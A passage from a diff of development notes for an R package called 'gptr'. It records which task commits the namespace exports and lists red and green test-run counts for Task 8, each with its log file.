+   `gptr_step()` (Task 10; an Rd cross-reference WARNING until then). Tests do not need them:
+   the test environment inherits the namespace, so `gptr`, its `$`/`[[`/`print`/`.DollarNames`
+   methods dispatch there under `devtools::test()` and R CMD check alike. Task 12 (or the
+   first task after Tasks 9 and 10 have landed) takes these lines; a document run in the shared
+   tree by another lane must not commit them.
+
+Validation: `progress/P08.md`, Task 8. Red (no `R/gptr-gateway.R`) `^gptr-gateway$`
+`[ FAIL 25 | WARN 0 | SKIP 0 | PASS 0 ]` (`dev/.validation/P08/task8-red-final-tests.log`);
+against the plan-literal source `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 89 ]`
+(`task8-red-adaptations-against-plan-literal.log`: the empty argument, `gateway_model_type()`
+missing, the classifier call ending as an internal error); green
+`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 120 ]` (`task8-green.log`; the plan's 20 tests give its 74).
